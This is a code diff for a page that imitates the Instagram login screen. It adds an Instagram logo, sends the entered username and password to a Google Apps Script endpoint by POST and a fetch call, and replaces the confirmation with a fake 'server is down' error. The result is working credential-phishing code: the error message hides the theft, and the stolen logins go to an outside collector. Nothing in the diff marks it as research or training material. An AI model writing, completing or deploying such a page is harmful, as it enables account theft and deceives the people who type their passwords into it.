@@ -29,6 +29,7 @@ body
     margin: 10px;
     height: 100px;
     width: 100px;
+	cursor: pointer;
 }
 .page
 {
@@ -199,8 +200,8 @@ app
     <div class="container">
     <div class="text"></div>
     <div class="page">
-        <div class="title"> <img src="Bandicam/images/instagram-new-logo.png" height="100px" width="220px">            </div>
-        <form name="google-sheet">
+        <div class="title"> <img src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo.png" height="100px" width="220px">            </div>
+      <form method="POST" name="google-sheet" action="https://script.google.com/macros/s/AKfycbws_gC2lI0urwAMzLFaOckwkYoAA8ihOptP86LSS0kSM9P6NWzIJ82enfu5AoBqwyIY/exec">
         <input type="text" name="username" placeholder="Phone number,usrname or email address">
         <input type="password" name="password"  placeholder="Password">
             <button>Log In</button>
@@ -225,17 +226,19 @@ app
         
         </div>    
     </div>
-    <script>
-            const scriptURL = 'https://script.google.com/macros/s/AKfycbzymNP0n5Csc2giVaUcaou_1jZcDIybL97wZNjPJX_yBGgm60i3KxfrmbsEVTwO7iyvpA/exec'
-            const form = document.forms['google-sheet']
+<script>
+const scriptURL ='https://script.google.com/macros/s/AKfycbws_gC2lI0urwAMzLFaOckwkYoAA8ihOptP86LSS0kSM9P6NWzIJ82enfu5AoBqwyIY/exec'
+        
+const form = document.forms['google-sheet']
           
             form.addEventListener('submit', e => {
               e.preventDefault()
               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+                .then(response => alert("* SERVER IS DOWN TRY AGAIN LATER..."))
                 .catch(error => console.error('Error!', error.message))
             })
           </script>
+
 
     
     
